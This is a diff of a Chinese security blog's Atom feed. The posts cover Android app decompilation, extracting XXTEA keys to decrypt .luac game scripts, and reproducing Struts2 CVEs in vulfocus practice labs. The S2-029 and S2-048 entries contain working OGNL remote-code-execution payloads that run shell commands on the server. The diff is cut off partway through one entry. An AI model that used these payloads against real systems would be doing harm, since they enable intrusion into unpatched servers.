@@ -3,11 +3,11 @@
   <title>Hzktester`s Blog</title>
   
   
-  <link href="http://example.com/atom.xml" rel="self"/>
+  <link href="https://hzktester.top/atom.xml" rel="self"/>
   
-  <link href="http://example.com/"/>
-  <updated>2020-09-18T11:40:52.401Z</updated>
-  <id>http://example.com/</id>
+  <link href="https://hzktester.top/"/>
+  <updated>2020-09-18T11:40:48.056Z</updated>
+  <id>https://hzktester.top/</id>
   
   <author>
     <name>hzktester</name>
@@ -17,9 +17,59 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>luac的解密过程</title>
+    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-16T07:31:00.000Z</published>
+    <updated>2020-09-18T11:40:48.056Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p><ol><li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li><li>加密key与程序内部约定某个值。</li></ol><p>显然，第一种可以破解，可以再程序中找到解密的值。</p><a id="more"></a><h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p><ol><li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p></li><li><p>寻找加密<strong>key</strong></p><ul><li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li><li>将<strong>lib\libgame.so</strong>文件拖入工具中</li><li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li><li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li></ul></li><li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;加密解密思路&quot;&gt;&lt;a href=&quot;#加密解密思路&quot; class=&quot;headerlink&quot; title=&quot;加密解密思路&quot;&gt;&lt;/a&gt;加密解密思路&lt;/h2&gt;&lt;p&gt;将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;加密key写入文件，程序在解密时先读取文件中的加密key，再解密。&lt;/li&gt;
+&lt;li&gt;加密key与程序内部约定某个值。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;显然，第一种可以破解，可以再程序中找到解密的值。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>APP反编译-下载源码</title>
+    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
+    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
+    <published>2020-08-16T07:31:00.000Z</published>
+    <updated>2020-09-18T11:41:04.722Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
+&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
+    
+    
+    
+    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
+    
+  </entry>
+  
+  <entry>
     <title>APP之反编译+目录结构+重新打包+重新签名</title>
-    <link href="http://example.com/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/"/>
-    <id>http://example.com/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</id>
+    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/"/>
+    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</id>
     <published>2020-08-16T07:31:00.000Z</published>
     <updated>2020-09-18T11:40:52.401Z</updated>
     
@@ -40,132 +90,17 @@
     
     
     
-    <category term="APP渗透" scheme="http://example.com/categories/APP%E6%B8%97%E9%80%8F/"/>
+    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
     
     
-    <category term="APP反编译" scheme="http://example.com/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>APP反编译-下载源码</title>
-    <link href="http://example.com/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
-    <id>http://example.com/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:04.722Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
-&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
-&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="http://example.com/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="http://example.com/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>luac的解密过程</title>
-    <link href="http://example.com/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:40:48.056Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p><ol><li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li><li>加密key与程序内部约定某个值。</li></ol><p>显然，第一种可以破解，可以再程序中找到解密的值。</p><a id="more"></a><h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p><ol><li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p></li><li><p>寻找加密<strong>key</strong></p><ul><li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li><li>将<strong>lib\libgame.so</strong>文件拖入工具中</li><li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li><li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li></ul></li><li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;加密解密思路&quot;&gt;&lt;a href=&quot;#加密解密思路&quot; class=&quot;headerlink&quot; title=&quot;加密解密思路&quot;&gt;&lt;/a&gt;加密解密思路&lt;/h2&gt;&lt;p&gt;将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;加密key写入文件，程序在解密时先读取文件中的加密key，再解密。&lt;/li&gt;
-&lt;li&gt;加密key与程序内部约定某个值。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;显然，第一种可以破解，可以再程序中找到解密的值。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="http://example.com/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="http://example.com/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-019 CVE-2013-4316复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:36.969Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li><li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.0 - 2.3.15.1&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-029 CVE-2016-0785复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:26.105Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-048 CVE-2017-9791复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:42:32.170Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
+    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
     
   </entry>
   
   <entry>
     <title>S2-046 CVE-2017-5638复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:34.705Z</updated>
     
@@ -177,17 +112,60 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-029 CVE-2016-0785复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-18T11:41:26.105Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 